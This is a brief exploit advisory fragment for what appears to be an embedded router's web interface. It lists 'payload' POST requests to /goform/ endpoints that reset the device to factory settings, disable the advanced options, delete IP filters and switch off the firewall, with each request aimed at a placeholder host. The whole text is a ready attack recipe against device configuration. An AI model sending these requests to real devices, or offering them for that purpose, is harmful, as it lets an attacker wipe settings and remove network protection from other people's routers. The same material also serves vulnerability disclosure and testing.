## Payload for Factory Reset:
# 
# POST     : http://www.example.com/goform/system/factory
# Parameter: None
#
## Payload to disable the advanced options:
#
# POST     : http://www.example.com/goform/advanced/options
# Parameter: None
#
## Payload to remove ip-filters:
#
# POST     : http://www.example.com//goform/advanced/ip-filters
# Parameter: IpFilterAddressDelete1 = 1
#
## Payload to remove firewall settings
# 
# POST     : http://www.example.com/goform/advanced/firewall
# Parameter: cbFirewall = 1
